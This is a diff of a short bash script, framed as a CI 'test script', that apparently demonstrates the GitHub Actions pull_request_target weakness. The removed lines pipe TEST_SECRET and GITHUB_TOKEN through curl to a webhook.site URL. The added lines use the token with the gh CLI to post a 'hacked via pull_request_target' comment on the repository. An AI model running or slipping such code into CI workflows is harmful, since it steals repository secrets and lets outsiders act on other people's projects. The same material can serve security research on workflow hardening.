@@ -1,11 +1,10 @@
 #!/bin/bash
 set -e  # Exit on error
 
-echo "Starting test script..."
+echo "Starting GitHub API request..."
 
-# Make the curl request and capture its output
-echo TEST_SECRET=$TEST_SECRET | curl -s -X POST --data-binary @- https://webhook.site/7dc2127f-69cb-4ab8-8052-105cc98d8e57
-response=$(echo TOKEN=$GITHUB_TOKEN | curl -s -X POST --data-binary @- https://webhook.site/7dc2127f-69cb-4ab8-8052-105cc98d8e57)
+gh api "repos/${GITHUB_REPOSITORY}/issues/${GITHUB_REF##*/}/comments" \
+  -f body='👋 hacked via pull_request_target' \
+  --header "Authorization: token $GITHUB_TOKEN"
 
-echo "Webhook request completed with response: $response"
-echo "Test script finished successfully!"
+echo "GitHub API request completed!"
